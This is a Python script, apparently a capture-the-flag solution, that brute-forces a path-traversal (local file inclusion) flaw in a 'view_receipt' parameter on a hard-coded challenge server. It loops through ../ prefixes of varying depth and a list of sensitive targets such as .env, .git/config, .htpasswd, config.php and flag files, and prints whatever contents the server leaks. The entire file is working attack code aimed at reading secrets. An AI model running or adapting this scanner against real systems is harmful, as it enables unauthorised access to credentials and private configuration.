import urllib.request
import sys
import time

# URL of the challenge
URL = "http://52.59.124.14:5069/"

# List of filenames to check
filenames = [
    ".dstore",
    ".env",
    ".git/config",
    ".git/HEAD",
    ".gitignore",
    ".htaccess",
    ".htpasswd",
    "0.01",
    "README.md",
    "access.log",
    "admin.php",
    "admin_fee.txt",
    "app.js",
    "app.py",
    "backend.php",
    "bill.php",
    "BillSplitter.php",
    "BillSplitterLite.php",
    "classes.php",
    "composer.json",
    "config.php",
    "dashboard.php",
    "database.php",
    "db.php",
    "error.log",
    "fee.php",
    "FinancialOracle.php",
    "flag",
    "flag.php",
    "flag.txt",
    "index.html",
    "index.php",
    "login.php",
    "logout.php",
    "logs.php",
    "main.js",
    "main.py",
    "package.json",
    "receipt.php",
    "register.php",
    "robots.txt",
    "server.js",
    "server.py",
    "settings.php",
    "sitemap.xml",
    "upload.php",
    "view.php",
    "web.config",
]

# Common LFI prefixes to try escaping from
prefixes = [
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../"
]


def check_file(filename):
    # Try different directory traversal depths
    for prefix in prefixes:
        target = prefix + filename
        params = urllib.parse.urlencode({'view_receipt': target})
        full_url = f"{URL}?{params}"

        try:
            with urllib.request.urlopen(full_url, timeout=5) as response:
                content_bytes = response.read()
                content_str = content_bytes.decode('utf-8', errors='ignore')

                if "File not found." not in content_str and "<pre><code>" in content_str:
                   
                    # Extract content within <pre><code>
                    start_marker = "<pre><code>"
                    end_marker = "</code></pre>"
                    start_index = content_str.find(start_marker)
                    end_index = content_str.find(end_marker)
                    
                    if start_index != -1 and end_index != -1:
                        extracted = content_str[start_index + len(start_marker):end_index]
                        
                        print(f"[+] Found potential file: {target}")
                        print(f"[+] Content length: {len(extracted)}")
                        if extracted.strip():
                            print(f"[+] Content preview: {extracted[:100]}")
                        else:
                            print(f"[+] Content looks empty.")
                        return True
        except Exception as e:
            # print(f"[-] Error checking {target}: {e}")
            pass
    return False

def main():
    print(f"[*] Starting brute-force on {URL}")
    for filename in filenames:
        check_file(filename)
        time.sleep(0.1) # Be nice to the server
    print("[*] Brute-force finished.")

if __name__ == "__main__":
    main()
